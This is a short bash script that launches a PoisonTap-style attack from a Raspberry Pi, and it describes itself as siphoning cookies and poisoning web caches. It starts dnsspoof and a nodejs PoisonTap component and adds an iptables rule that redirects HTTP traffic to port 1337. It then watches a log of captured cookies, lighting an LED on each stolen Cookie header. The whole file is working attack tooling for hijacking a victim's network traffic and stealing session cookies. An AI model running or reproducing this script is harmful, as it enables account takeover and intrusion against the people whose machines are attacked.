#!/bin/bash

echo 'running siphons cookies and web cache poisoning'
HOME='/home/pi/'

[[ $(pgrep dnsspoof) = '' ]] && {
  dnsspoof -i "$1" port 53
}

[[ $(pgrep pi_poisontap.js) = '' ]] && {
  nodejs $HOME/src/poisontap/pi_poisontap.js
}

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
}

tail -f $HOME/src/poisontap/poisontap.cookies.log | while read line
do
	if echo $line | grep 'Cookie:' --color=auto; then
		led yellow on 2> /dev/null
	fi
done